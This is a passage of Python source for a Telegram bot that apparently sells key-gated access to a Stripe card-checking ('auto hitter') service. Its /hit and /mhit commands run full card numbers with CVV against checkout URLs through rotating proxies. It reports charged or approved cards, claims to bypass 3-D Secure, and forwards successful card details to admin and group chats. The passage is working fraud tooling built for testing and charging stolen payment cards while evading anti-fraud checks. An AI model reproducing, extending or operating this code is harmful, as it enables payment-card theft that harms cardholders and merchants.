        d, s  = delta.days, delta.seconds
        if d < 0:
            return f"{E_WARN} <b>EXPIRED</b>"
        return f"{d}d {s // 3600}h remaining"
    except Exception:
        return "?"

def status_badge(row) -> str:
    if not row["active"]:
        return f"{E_X} <b>INACTIVE</b>"
    try:
        if datetime.fromisoformat(row["expires_at"]) < datetime.utcnow():
            return f"{E_ALRM} <b>EXPIRED</b>"
    except (TypeError, ValueError):
        pass
    return f"{E_OK} <b>ACTIVE</b>"

def hit_header(status: str) -> str:
    if status == "charged":
        return f"{ZANGI} {fb('CHARGED')} {E_OK}"
    if status == "approved":
        return f"{ZANGI} {fb('APPROVED')} {E_FIRE}"
    return f"{ZANGI} {fb('DECLINED')} {E_X}"


# ═══════════════════════════════════════════════════════════════════════════════
#  CHARGE NOTIFY
# ═══════════════════════════════════════════════════════════════════════════════

async def send_charge_notify(card_str: str, username: str, uid: int, result: dict) -> None:
    if not NOTIFY_BOT_TOKEN:
        return
    try:
        bot      = _Bot(NOTIFY_BOT_TOKEN)
        bin_info = result.get("bin_info") or {}
        elapsed  = result.get("seconds")
        t_str    = f"{elapsed:.2f}s" if elapsed is not None else "—"
        uname    = f"@{html.escape(username)}" if username else f"<code>{uid}</code>"

        admin_text = (
            f"{ZANGI} {fb('CHARGE HIT')} {E_OK}\n\n"
            f"<b>{E_CARD} Card    :</b> <code>{html.escape(card_str)}</code>\n"
            f"<b>{E_LIKE} User    :</b> {uname} (<code>{uid}</code>)\n"
            f"<b>💬 Message :</b> <code>{html.escape((result.get('result_msg') or '')[:100])}</code>\n\n"
            f"<b>━━━ 🏪 Merchant ━━━</b>\n"
            f"<b>🏬 Store   :</b> {html.escape(result.get('merchant') or 'Unknown')}\n"
            f"<b>{E_PACK} Product :</b> {html.escape(result.get('product') or 'Unknown')}\n"
            f"<b>{E_DOLR} Amount  :</b> {html.escape(result.get('price_display') or '-')}\n\n"
            f"<b>━━━ {E_CARD} BIN Info ━━━</b>\n"
            f"<b>{E_CASH} Bank    :</b> {html.escape(bin_info.get('bank') or 'Unknown')}\n"
            f"<b>{E_SPRK} Brand   :</b> {html.escape(bin_info.get('brand') or '?')} "
            f"{html.escape(bin_info.get('type') or '?')}\n"
            f"<b>{E_GLOB} Country :</b> {html.escape(bin_info.get('country') or 'Unknown')}\n"
            f"<b>⏱️ Time    :</b> {t_str}"
        )
        await bot.send_message(chat_id=NOTIFY_CHAT_ID, text=admin_text, parse_mode="HTML")

        group_text = (
            f"{E_OK} <b>Status:</b> CHARGED\n"
            f"📋 <b>Response:</b> {html.escape((result.get('result_msg') or 'Payment Successful')[:100])}\n"
            f"🏪 <b>Merchant:</b> {html.escape(result.get('merchant') or 'Unknown')}\n"
            f"{E_PACK} <b>Product:</b> {html.escape(result.get('product') or 'Unknown')}\n"
            f"{E_CASH} <b>Amount:</b> {html.escape(result.get('price_display') or '-')}\n"
            f"👨‍💻 <b>User:</b> {uname}"
        )
        main_bot = _Bot(BOT_TOKEN)
        await main_bot.send_message(chat_id=GROUP_CHAT_ID,   text=group_text,  parse_mode="HTML")
        await main_bot.send_message(chat_id=GROUP_CHAT_ID_2, text=admin_text,  parse_mode="HTML")
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
#  AUTH GUARDS
# ═══════════════════════════════════════════════════════════════════════════════

def is_admin(uid: int) -> bool:
    return uid == ADMIN_ID

async def guard(update: Update) -> bool:
    uid = update.effective_user.id
    if is_admin(uid):
        return True
    if not is_authorized(uid):
        await update.message.reply_html(
            f"{ZANGI} {fb('ACCESS DENIED')} {E_LOCK}\n\n"
            "You are <b>not authorized</b>.\n\n"
            "Use <code>/start &lt;KEY&gt;</code> to activate your account,\n"
            "or contact the administrator."
        )
        return False
    return True


# ═══════════════════════════════════════════════════════════════════════════════
#  USER COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    args = ctx.args

    if args:
        key_val = args[0].upper().strip()
        key = use_key(key_val, user.id)
        if not key:
            await update.message.reply_html(
                f"{ZANGI} {fb('INVALID KEY')} {E_X}\n\n"
                "Key is <b>invalid</b> or <b>already used</b>.\n"
                "Contact the admin to obtain a valid key."
            )
            return
        expires_at = upsert_user(
            user_id=user.id, username=user.username or "",
            first_name=user.first_name or "", days=key["days"],
            authorized_by=key["created_by"], key_used=key_val,
        )
        await update.message.reply_html(
            f"{ZANGI} {fb('ACTIVATED')} {E_OK}\n\n"
            f"<b>{E_PRTY} Welcome,</b> {esc(user.first_name)}!\n\n"
            f"<b>━━━ Account Details ━━━</b>\n"
            f"<b>{E_DIAM} Key Used :</b> <code>{esc(key_val)}</code>\n"
            f"<b>{E_WAIT} Duration :</b> {key['days']} days\n"
            f"<b>{E_ALRM} Expires  :</b> {days_left(expires_at)}\n\n"
            f"Use /cmds to see all available commands."
        )
        return

    if is_admin(user.id):
        await update.message.reply_html(
            f"{ZANGI} {fb('SHOPI BOT')} • {fb('Admin Panel')} {E_CRWN}\n\n"
            f"<b>Welcome back, Admin.</b>\n\n"
            f"<b>━━━ Quick Access ━━━</b>\n"
            f"/cmds — Full command reference\n"
            f"/users — View all users\n"
            f"/genkey — Generate an activation key\n"
            f"/auth — Manually authorize a user"
        )
    else:
        authorized = is_authorized(user.id)
        badge = f"{E_OK} You are <b>authorized</b>." if authorized else f"{E_X} You are <b>not authorized</b>."
        await update.message.reply_html(
            f"{ZANGI} {fb('SHOPI BOT')} {E_FIRE}\n\n"
            f"{badge}\n\n"
            f"Activate: <code>/start &lt;KEY&gt;</code>\n"
            f"Commands: /cmds"
        )


async def cmd_cmds(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    admin_block = ""
    if is_admin(uid):
        admin_block = (
            f"\n◆ {E_CRWN} {fb('ADMIN COMMANDS')}\n"
            f"<code>{'─'*28}</code>\n"
            f"› <code>/auth</code>      {fb('uid days')}  ‣ {fb('Authorize user')}\n"
            f"› <code>/deauth</code>    {fb('uid')}       ‣ {fb('Revoke access')}\n"
            f"› <code>/adddays</code>   {fb('uid days')}  ‣ {fb('Extend access')}\n"
            f"› <code>/genkey</code>    {fb('days')}      ‣ {fb('Generate key')}\n"
            f"› <code>/genkeys</code>   {fb('amount days')} ‣ {fb('Generate mass keys')}\n"
            f"› <code>/delkey</code>    {fb('KEY')}       ‣ {fb('Delete unused key')}\n"
            f"› <code>/keys</code>               ‣ {fb('List all keys')}\n"
            f"› <code>/users</code>              ‣ {fb('List all users')}\n"
            f"› <code>/status</code>   {fb('uid')}        ‣ {fb('Full user report')}\n"
            f"› <code>/broadcast</code> {fb('msg')}       ‣ {fb('Message everyone')}\n"
        )
    text = (
        f"╭{'─'*26}╮\n"
        f"│  {BAMBOO}  {fb('TEAM BAMBOO BOT')}       │\n"
        f"╰{'─'*26}╯\n\n"
        f"◆ {E_CARD} {fb('CHECKER')}\n"
        f"<code>{'─'*28}</code>\n"
        f"› <code>/hit</code>\n"
        f"  ⌞ {fb('Single card Stripe autohit')}\n"
        f"  ⌞ <code>/hit &lt;url&gt; &lt;card&gt; [proxy]</code>\n\n"
        f"› <code>/mhit</code>\n"
        f"  ⌞ {fb('Mass cards — one URL, many cards')}\n"
        f"  ⌞ <code>/mhit &lt;url&gt; &lt;card1&gt; [card2...]</code>\n\n"
        f"› <code>/check</code>\n"
        f"  ⌞ {fb('BIN lookup only')}\n"
        f"  ⌞ <code>/check &lt;card&gt;</code>\n\n"
        f"◆ {E_MGIC} {fb('SETTINGS')}\n"
        f"<code>{'─'*28}</code>\n"
        f"› <code>/setproxy</code>    ‣ {fb('Save proxy (auto-checked)')}\n"
        f"› <code>/checkproxy</code>  ‣ {fb('Check proxies, mass support')}\n"
        f"› <code>/delproxy</code>    ‣ {fb('Remove saved proxy')}\n"
        f"› <code>/me</code>          ‣ {fb('Account info & stats')}\n"
        f"› <code>/start KEY</code>   ‣ {fb('Activate a key')}\n"
        f"{admin_block}\n"
        f"◆ {E_PIN} {fb('CARD FORMAT')}\n"
        f"<code>{'─'*28}</code>\n"
        f"<code>number|mm|yyyy|cvv</code>\n"
        f"  ⌞ {fb('e.g.')} <code>4111111111111111|12|2026|123</code>\n\n"
        f"◆ {E_GLOB} {fb('PROXY FORMATS')}\n"
        f"<code>{'─'*28}</code>\n"
        f"<code>host:port</code>\n"
        f"<code>host:port:user:pass</code>\n"
        f"<code>user:pass@host:port</code>\n\n"
        f"╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌\n"
        f"  {ZANGI} {fb('Developer Zangi')} • {BAMBOO} {fb('Team Bamboo')}"
    )
    anime_gif = "https://media.tenor.com/jOFn_8OhWrYAAAAC/anime-hacker.gif"
    try:
        await update.message.reply_animation(animation=anime_gif, caption=text, parse_mode=ParseMode.HTML)
    except Exception:
        await update.message.reply_html(text)


async def cmd_me(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard(update):
        return
    user = update.effective_user
    row  = get_user(user.id)

    if is_admin(user.id) and not row:
        await update.message.reply_html(
            f"{ZANGI} {fb('ADMIN')} {E_CRWN}\n\n"
            f"<b>{E_PIN} ID    :</b> <code>{user.id}</code>\n"
            f"<b>{E_LIKE} Name  :</b> {esc(user.first_name)}\n"
            f"<b>{E_STAT} Role  :</b> {E_CRWN} <b>Administrator</b>\n"
            f"<b>♾️ Access :</b> Unlimited"
        )
        return

    if not row:
        await update.message.reply_html(f"{E_X} No account record found.")
        return

    total    = row["checks_done"] or 0
    charged  = row["charged"]     or 0
    approved = row["approved"]    or 0
    declined = row["declined"]    or 0
    rate     = f"{charged/total*100:.1f}%" if total else "—"

    await update.message.reply_html(
        f"{ZANGI} {fb('MY ACCOUNT')} {E_LIKE}\n\n"
        f"<b>{E_PIN} User ID  :</b> <code>{user.id}</code>\n"
        f"<b>{E_LIKE} Name     :</b> {esc(user.first_name)}\n"
        f"<b>{E_STAR} Username :</b> @{esc(user.username or 'N/A')}\n\n"
        f"<b>━━━ {E_LOCK} Access ━━━</b>\n"
        f"<b>{E_STAT} Status   :</b> {status_badge(row)}\n"
        f"<b>{E_WAIT} Expires  :</b> {days_left(row['expires_at'])}\n"
        f"<b>{E_DIAM} Key      :</b> <code>{esc(row['key_used'] or 'Direct auth')}</code>\n\n"
        f"<b>━━━ {E_STAT} Statistics ━━━</b>\n"
        f"<b>{E_STAT} Total    :</b> {total}\n"
        f"<b>{E_CASH} Charged  :</b> {charged}\n"
        f"<b>{E_OK} Approved :</b> {approved}\n"
        f"<b>{E_X} Declined :</b> {declined}\n"
        f"<b>{E_STAT} Hit Rate :</b> {rate}\n\n"
        f"<b>{E_GLOB} Proxy    :</b> <code>{esc(row['proxy'] or 'Not set')}</code>"
    )


async def cmd_setproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard(update):
        return
    raw_text = update.message.text or ""
    parts    = raw_text.split(None, 1)
    proxy_raw = parts[1] if len(parts) > 1 else ""
    proxies  = [p.strip() for p in proxy_raw.split() if p.strip()]

    if not proxies:
        await update.message.reply_html(
            f"{E_X} <b>Usage:</b> <code>/setproxy &lt;proxy&gt;</code>\n\n"
            "<b>Accepted formats:</b>\n"
            "<code>host:port</code>\n"
            "<code>host:port:user:pass</code>\n"
            "<code>user:pass@host:port</code>\n\n"
            "<b>Mass save (one per line):</b>\n"
            "<code>/setproxy\nhost:port:user:pass\nhost:port:user:pass</code>\n\n"
            "<i>All live proxies are checked and saved automatically.</i>"
        )
        return

    uid = update.effective_user.id

    if len(proxies) == 1:
        proxy = proxies[0]
        wait_msg = await update.message.reply_html(
            f"{E_SRCH} <b>Checking proxy...</b>\n\n"
            f"<code>{esc(proxy)}</code>\n\n"
            f"<i>{E_WAIT} Testing connectivity, please wait...</i>"
        )
        try:
            result = await asyncio.to_thread(check_proxy, proxy)
        except Exception as exc:
            await wait_msg.edit_text(
                f"{E_X} <b>Proxy check error:</b> <code>{esc(str(exc)[:200])}</code>",
                parse_mode=ParseMode.HTML,
            )
            return

        if not result["alive"]:
            err = esc(result.get("error") or "No response")
            await wait_msg.edit_text(
                f"{ZANGI} {fb('PROXY REJECTED')} {E_X}\n\n"
                f"<b>{E_GLOB} Proxy  :</b> <code>{esc(proxy)}</code>\n"
                f"<b>{E_WARN} Reason :</b> {err}\n\n"
                f"<i>Proxy is dead — not saved. Fix it and try again.</i>",
                parse_mode=ParseMode.HTML,
            )
            return

        set_proxy(uid, proxy)
        flag    = country_flag(result.get("country_code") or "")
        country = esc(result.get("country") or "Unknown")
        city    = esc(result.get("city") or "")
        ms      = result["ms"]
        bar     = ms_bar(ms)
        loc     = f"{flag} {country}" + (f", {city}" if city else "")
        await wait_msg.edit_text(
            f"{ZANGI} {fb('PROXY SAVED')} {E_OK}\n\n"
            f"<b>{E_GLOB} Proxy    :</b> <code>{esc(proxy)}</code>\n"
            f"<b>{E_STAT} Status   :</b> {E_OK} LIVE  {bar}\n"
            f"<b>{E_FIRE} Response :</b> {ms}ms\n"
            f"<b>{E_PIN} Location :</b> {loc}\n"
            + (f"<b>{E_PIN} Exit IP  :</b> <code>{esc(result['ip'])}</code>\n" if result.get("ip") else "")
            + (f"<b>{E_PHOR} ISP      :</b> {esc(result['isp'])}\n" if result.get("isp") else ""),
            parse_mode=ParseMode.HTML,
        )
        return

    limit = 50
    if len(proxies) > limit:
        proxies = proxies[:limit]
        await update.message.reply_html(f"{E_WARN} <b>Limit: {limit} proxies.</b> First {limit} will be tested.")

    wait_msg = await update.message.reply_html(
        f"{ZANGI} {fb('PROXY CHECKER')} {E_GLOB}\n\n"
        f"{E_WAIT} <b>Checking {len(proxies)} proxies...</b>\n\n"
        f"<i>Testing all proxies, please wait...</i>"
    )
    try:
        results = await asyncio.to_thread(check_proxies_bulk, proxies)
    except Exception as exc:
        await wait_msg.edit_text(
            f"{E_X} <b>Check failed:</b> <code>{esc(str(exc)[:300])}</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    live_results = [r for r in results if r["alive"]]
    dead_results = [r for r in results if not r["alive"]]

    if not live_results:
        await wait_msg.edit_text(
            f"{ZANGI} {fb('PROXY REJECTED')} {E_X}\n\n"
            f"{E_X} <b>All {len(proxies)} proxies are dead.</b>\n\n"
            f"<i>Nothing saved. Fix your proxies and try again.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    proxy_pool = "\n".join(r["proxy"] for r in live_results)
    set_proxy(uid, proxy_pool)

    count_live  = len(live_results)
    count_dead  = len(dead_results)
    saved_lines = "\n".join(f"  {E_OK} <code>{esc(r['proxy'])}</code>" for r in live_results[:10])
    more        = f"\n  <i>...and {count_live - 10} more</i>" if count_live > 10 else ""

    await wait_msg.edit_text(
        f"{ZANGI} {fb('PROXIES SAVED')} {E_OK}\n\n"
        f"{E_STAT} Tested: <b>{len(proxies)}</b>  |  "
        f"{E_OK} Live: <b>{count_live}</b>  |  "
        f"{E_X} Dead: <b>{count_dead}</b>\n\n"
        f"{E_OK} <b>Saved to your proxy pool:</b>\n"
        f"{saved_lines}{more}",
        parse_mode=ParseMode.HTML,
    )


async def cmd_delproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard(update):
        return
    set_proxy(update.effective_user.id, "")
    await update.message.reply_html(f"{E_OK} <b>Proxy removed successfully.</b>")


async def cmd_checkproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard(update):
        return

    raw_text  = update.message.text or ""
    parts     = raw_text.split(None, 1)
    proxy_raw = parts[1] if len(parts) > 1 else ""
    proxies   = [p.strip() for p in proxy_raw.split() if p.strip()]

    if not proxies:
        await update.message.reply_html(
            f"{ZANGI} {fb('PROXY CHECKER')} {E_GLOB}\n\n"
            "<b>Usage:</b>\n"
            "<code>/checkproxy &lt;proxy1&gt; [proxy2] ...</code>\n\n"
            "<b>Mass check (one per line):</b>\n"
            "<code>/checkproxy\nhost:port\nhost:port:user:pass\nuser:pass@host:port</code>\n\n"
            "<b>Supported formats:</b>\n"
            "• <code>host:port</code>\n"
            "• <code>host:port:user:pass</code>\n"
            "• <code>user:pass@host:port</code>\n\n"
            "<i>Dead proxies are listed but NOT saved to your account.\n"
            "Live proxies replace your saved proxy automatically.</i>"
        )
        return

    limit = 50
    if len(proxies) > limit:
        proxies = proxies[:limit]
        await update.message.reply_html(f"{E_WARN} <b>Limit: {limit} proxies per check.</b> First {limit} will be tested.")

    wait_msg = await update.message.reply_html(
        f"{ZANGI} {fb('PROXY CHECKER')} {E_GLOB}\n\n"
        f"{E_WAIT} <b>Checking {len(proxies)} {'proxy' if len(proxies)==1 else 'proxies'}...</b>\n\n"
        f"<i>This may take a moment. Please wait.</i>"
    )
    try:
        results = await asyncio.to_thread(check_proxies_bulk, proxies)
    except Exception as exc:
        await wait_msg.edit_text(
            f"{E_X} <b>Check failed:</b> <code>{esc(str(exc)[:300])}</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    uid          = update.effective_user.id
    live_results = [r for r in results if r["alive"]]
    if live_results:
        proxy_pool = "\n".join(r["proxy"] for r in live_results)
        set_proxy(uid, proxy_pool)

    _emap = {
        "GLOB": E_GLOB, "STAT": E_STAT, "OK": E_OK, "X": E_X,
        "FIRE": E_FIRE, "WARN": E_WARN, "PIN": E_PIN, "PHOR": E_PHOR,
        "CRWN": E_CRWN,
    }
    box_html = format_bulk_results_html(results, _emap, esc)

    footer = ""
    if live_results:
        count       = len(live_results)
        saved_lines = "\n".join(f"<code>{esc(r['proxy'])}</code>" for r in live_results[:5])
        more        = f"\n<i>...and {count - 5} more</i>" if count > 5 else ""
        footer = (
            f"\n\n{E_OK} <b>{count} live {'proxy' if count == 1 else 'proxies'} saved!</b>\n"
            f"{saved_lines}{more}"
        )

    msg_text = box_html + footer
    if len(msg_text) > 4000:
        msg_text = box_html[:3800] + "\n<i>... (truncated)</i>" + footer

    await wait_msg.edit_text(msg_text, parse_mode=ParseMode.HTML)


# ═══════════════════════════════════════════════════════════════════════════════
#  CHECKER COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════

async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard(update):
        return

    if len(ctx.args) < 2:
        await update.message.reply_html(
            f"{ZANGI} {fb('AUTO HITTER')} {E_FIRE}\n\n"
            "<b>Usage:</b>\n"
            "<code>/hit &lt;checkout_url&gt; &lt;card&gt; [proxy]</code>\n\n"
            "<b>Card format:</b>\n"
            "<code>number|mm|yyyy|cvv</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/hit https://checkout.stripe.com/c/pay/... "
            "4111111111111111|12|2026|123</code>"
        )
        return

    checkout_url = ctx.args[0]
    card_str     = ctx.args[1]
    uid          = update.effective_user.id

    if len(ctx.args) > 2 and "|" in ctx.args[2]:
        await update.message.reply_html(
            f"{E_X} <b>Multiple cards detected.</b>\n\n"
            "Use <code>/mhit</code> for mass checking:\n"
            "<code>/mhit &lt;url&gt; &lt;card1&gt; &lt;card2&gt; ...</code>"
        )
        return

    proxy_arg = ctx.args[2] if len(ctx.args) > 2 else None
    card      = parse_co_card(card_str)
    if not card:
        await update.message.reply_html(
            f"{E_X} <b>Invalid card format.</b>\n"
            "Use: <code>number|mm|yyyy|cvv</code>"
        )
        return

    if proxy_arg:
        proxy_list_db = [proxy_arg]
    else:
        proxy_list_db = get_proxy_list(uid)
    proxy_str = proxy_list_db[0] if proxy_list_db else ""
    if not proxy_str:
        await update.message.reply_html(
            f"{E_X} <b>No proxy configured.</b>\n\n"
            "Set one with: <code>/setproxy host:port:user:pass</code>\n"
            "Or include inline: <code>/hit url card proxy</code>"
        )
        return

    pcount      = len(proxy_list_db)
    proxy_label = f"{pcount} proxies" if pcount > 1 else "Configured"
    wait_msg    = await update.message.reply_html(
        f"{BAMBOO} {fb('Team Bamboo')}\n\n"
        f"<b>{E_CARD} Card:</b> <tg-spoiler>{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}</tg-spoiler>\n"
        f"<b>{E_GLOB} Proxy :</b> <code>{proxy_label}</code>\n"
        f"<b>{E_WAIT} Status:</b> Please wait..."
    )

    try:
        result = await asyncio.to_thread(
            run_hit_check, checkout_url, card_str,
            proxy_data=proxy_str, proxy_list=proxy_list_db,
            max_proxy_retries=max(2, pcount),
        )
    except Exception as exc:
        await wait_msg.edit_text(
            f"{E_X} <b>Internal error:</b>\n<code>{esc(str(exc)[:300])}</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    if not result.get("ok"):
        err  = esc(result.get("error", "Unknown error")[:300])
        dead = "⚰️ Session is dead." if result.get("session_dead") else ""
        await wait_msg.edit_text(
            f"{ZANGI} {fb('CHECK FAILED')} {E_X}\n\n"
            f"<b>{E_CARD} Card   :</b> <tg-spoiler>{esc(card_str)}</tg-spoiler>\n"
            f"<b>{E_WARN} Error  :</b> <code>{err}</code>\n"
            f"{dead}",
            parse_mode=ParseMode.HTML,
        )
        return

    update_stats(uid, result.get("result_status", "declined"))
    status = result.get("result_status", "declined")

    if status == "charged":
        asyncio.create_task(send_charge_notify(
            card_str, update.effective_user.username or "", uid, result,
        ))

    bin_info  = result.get("bin_info") or {}
    elapsed   = result.get("seconds")
    time_str  = fb(f"{elapsed:.1f}s") if elapsed is not None else fb("N/A")
    tds_ok    = result.get("tds_bypassed", False)
    hcap      = f"{E_WARN} {fb('Yes')}" if result.get("hcaptcha") else fb("No")
    email_str = fbe(result.get("email") or "")

    if status == "charged":
        status_line = f"{fb('CHARGED')} {E_OK} • {fb('Payment Successful')}"
        card_icon   = E_OK
    elif status == "approved":
        status_line = f"{fb('APPROVED')} 🟡 • {fb('Card Approved')}"
        card_icon   = "🟡"
    else:
        status_line = f"{fb('DECLINED')} {E_X} • {fb('Payment Failed')}"
        card_icon   = E_X

    tds_str = f"{E_OK} {fb('3DS Bypassed')}" if tds_ok else f"{E_X} {fb('3DS Not Bypassed')}"
    url_val = esc(
        result.get("success_url") or result.get("return_url") or
        result.get("redirect_url") or checkout_url
    )
    decline_msg = fbe((result.get("result_msg") or "Declined")[:120])

    if status == "declined":
        reply = (
            f"{ZANGI} {fb('DECLINED')} {E_X}\n\n"
            f"{E_CARD} <tg-spoiler>{esc(card_str)}</tg-spoiler>\n"
            f"{fb('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')}\n"
            f"{E_X} {fb('Status')}   : {fb('Payment Failed')}\n"
            f"{E_ALRM} {fb('Time')}     : {time_str} ↳ {tds_str}\n\n"
            f"{fb('━━━')} {E_CARD} {fb('BIN Info')} {fb('━━━')}\n"
            f"{E_CASH} {fb('Bank')}    : {fbe(bin_info.get('bank','Unknown'))}\n"
            f"{E_SPRK} {fb('Brand')}   : {fbe(bin_info.get('brand','?'))} "
            f"{fbe(bin_info.get('type','?'))} {fbe(bin_info.get('level','?'))}\n"
            f"{E_GLOB} {fb('Country')} : {fbe(bin_info.get('country','Unknown'))}\n\n"
            f"{fb('━━━')} {E_WARN} {fb('Decline Info')} {fb('━━━')}\n"
            f"{E_NOTE} {fb('Reason')}  : {decline_msg}\n"
            f"{E_SREN} {fb('hCaptcha')}: {hcap}\n\n"
            f"━ {ZANGI} {fb('Developer Zangi')}\n"
            f"━ {E_STAR} {fb('By')} @{esc(update.effective_user.username or str(uid))}"
        )
    else:
        reply = (
            f"{card_icon} <tg-spoiler>{esc(card_str)}</tg-spoiler>\n\n"
            f"{status_line}\n"
            f"{E_ALRM} {time_str} ↳ {tds_str}\n\n"
            f"{fb('━━━')} {E_CART} {fb('Merchant')} {fb('━━━')}\n"
            f"{E_GOLD} {fb('Store')}   : {fbe(result.get('merchant','Unknown'))}\n"
            f"{E_PACK} {fb('Product')} : {fbe(result.get('product','Unknown'))}\n"
            f"{E_DOLR} {fb('Amount')}  : {fbe(result.get('price_display','-'))}\n"
            f"📧 {fb('Email')}   : {email_str}\n"
            f"{E_PIN} {fb('Url')}: <code>{url_val}</code>\n\n"
            f"{fb('━━━')} {E_CARD} {fb('BIN Info')} {fb('━━━')}\n"
            f"{E_CASH} {fb('Bank')}    : {fbe(bin_info.get('bank','Unknown'))}\n"
            f"{E_SPRK} {fb('Brand')}   : {fbe(bin_info.get('brand','?'))} "
            f"{fbe(bin_info.get('type','?'))} {fbe(bin_info.get('level','?'))}\n"
            f"{E_GLOB} {fb('Country')} : {fbe(bin_info.get('country','Unknown'))}\n\n"
            f"{E_NOTE} {fb('Message')} : {fbe(result.get('result_msg','')[:120])}\n"
            f"{E_SREN} {fb('hCaptcha')}: {hcap}\n\n"
            f"━ {E_CRWN} {fb('Bypassed By Sir Kamal')}\n"
            f"━ {E_PRAY} {fb('Special Thanks Ghost')}\n"
            f"━ {ZANGI} {fb('Developer Zangi')}\n"
            f"━ {E_STAR} {fb('By')} @{esc(update.effective_user.username or str(uid))}"
        )
    await wait_msg.edit_text(reply, parse_mode=ParseMode.HTML)

    if status == "charged":
        merchant = esc(result.get("merchant") or "Unknown")
        amount   = esc(result.get("price_display") or "—")
        await update.message.reply_html(
            f"{E_PRTY} {fb('PAYMENT SUCCESSFUL')} {E_FIRE}\n\n"
            f"{E_CASH} {fb('Amount')}   : {amount}\n"
            f"{E_CART} {fb('Merchant')} : {merchant}\n"
            f"{E_CARD} {fb('Card')}     : <tg-spoiler>{'*' * 12}{esc(card_str[-4:])}</tg-spoiler>\n\n"
            f"{E_CRWN} {fb('Congrats! Payment went through.')}\n"
            f"{E_STAR} {fb('By')} @{esc(update.effective_user.username or str(uid))}"
        )


async def cmd_mhit(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard(update):
        return

    raw_text = update.message.text or ""
    parts    = raw_text.split(None, 2)

    if len(parts) < 3:
        await update.message.reply_html(
            f"{BAMBOO} {fb('Team Bamboo')}\n\n"
            "<b>Usage:</b>\n"
            "<code>/mhit &lt;checkout_url&gt; &lt;card1&gt; [card2] ...</code>\n\n"
            "<b>Mass (one card per line):</b>\n"
            "<code>/mhit https://checkout.stripe.com/...\n"
            "4111111111111111|12|2026|123\n"
            "5333331111112222|06|2027|456\n"
            "378282246310005|09|2025|789</code>\n\n"
            "<b>Card format:</b> <code>number|mm|yyyy|cvv</code>\n"
            "<i>Proxy must be set via /setproxy (or pass as last arg if no | in it)</i>"
        )
        return

    checkout_url = parts[1].strip()
    card_block   = parts[2]
    uid          = update.effective_user.id

    raw_tokens = card_block.split()
    cards: list[str] = []
    proxy_arg: str | None = None
    for tok in raw_tokens:
        if "|" in tok:
            cards.append(tok.strip())
        else:
            proxy_arg = tok.strip()

    if not cards:
        await update.message.reply_html(
            f"{E_X} <b>No valid cards found.</b>\n"
            "Card format: <code>number|mm|yyyy|cvv</code>"
        )
        return

    parsed_cards = []
    bad = []
    for c in cards:
        p = parse_co_card(c)
        if p:
            parsed_cards.append((c, p))
        else:
            bad.append(c)

    if bad:
        await update.message.reply_html(
            f"{E_X} <b>{len(bad)} invalid card(s) — skipped.</b>\n"
            + "\n".join(f"• <code>{esc(b[:30])}</code>" for b in bad[:5])
        )
        if not parsed_cards:
            return

    if proxy_arg:
        proxy_list_db = [proxy_arg]
    else:
        proxy_list_db = get_proxy_list(uid)
    proxy_str = proxy_list_db[0] if proxy_list_db else ""
    if not proxy_str:
        await update.message.reply_html(
            f"{E_X} <b>No proxy configured.</b>\n\n"
            "Set one first: <code>/setproxy host:port:user:pass</code>\n"
            "Or append inline: <code>/mhit &lt;url&gt; &lt;cards...&gt; host:port:u:p</code>"
        )
        return

    total = len(parsed_cards)
    limit = 30
    if total > limit:
        parsed_cards = parsed_cards[:limit]
        total        = limit
        await update.message.reply_html(
            f"{E_WARN} <b>Limit: {limit} cards per run.</b> First {limit} will be checked."
        )

    # ── Box builder helpers ────────────────────────────────────────────────────
    def _s_icon(s: str) -> str:
        return {"charged": "💚", "approved": "🟡"}.get(s, "🔴")

    def _fmt_result(i: int, card: dict, res: dict, status: str) -> str:
        mf   = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
        icon = _s_icon(status)
        if res.get("ok"):
            t_str = fb(f"{res['seconds']:.1f}s") if res.get("seconds") is not None else fb("—")
            tds   = f"{E_OK} {fb('3DS Bypassed')}" if res.get("tds_bypassed") else f"{E_X} {fb('3DS Not Bypassed')}"
            if status == "charged":
                return (
                    f"{icon} <tg-spoiler>{mf}</tg-spoiler>\n"
                    f"       {fb('CHARGED')} {E_OK} • {fb('Payment Successful')}\n"
                    f"       {E_ALRM} {t_str} ↳ {tds}"
                )
            elif status == "approved":
                return (
                    f"{icon} <tg-spoiler>{mf}</tg-spoiler>\n"
                    f"       {fb('APPROVED')} 🟡 • {fb('Card Approved')}\n"
                    f"       {E_ALRM} {t_str} ↳ {tds}"
                )
            else:
                reason = fbe((res.get("result_msg") or "Declined")[:60])
                return (
                    f"{E_X} <tg-spoiler>{mf}</tg-spoiler>\n"
                    f"       {fb('DECLINED')} {E_X} • {fb('Payment Failed')}\n"
                    f"       {E_ALRM} {t_str} ↳ {tds}\n"
                    f"       {E_NOTE} {reason}"
                )
        else:
            err = fbe((res.get("error") or res.get("result_msg") or "Failed")[:60])
            return (
                f"{E_X} <tg-spoiler>{mf}</tg-spoiler>\n"
                f"       {fb('DECLINED')} {E_X} • {fb('Payment Failed')}\n"
                f"       {E_NOTE} {err}"
            )

    def build_box(
        done: list[dict], cur_idx: int | None, cur_masked: str | None,
        ch: int, ap: int, dc: int, finished: bool = False, merchant: dict | None = None,
    ) -> str:
        lines = [f"{BAMBOO} {fb('Team Bamboo')}", ""]
        if merchant:
            lines += [
                f"{fb('━━━')} {E_CART} {fb('Merchant')} {fb('━━━')}",
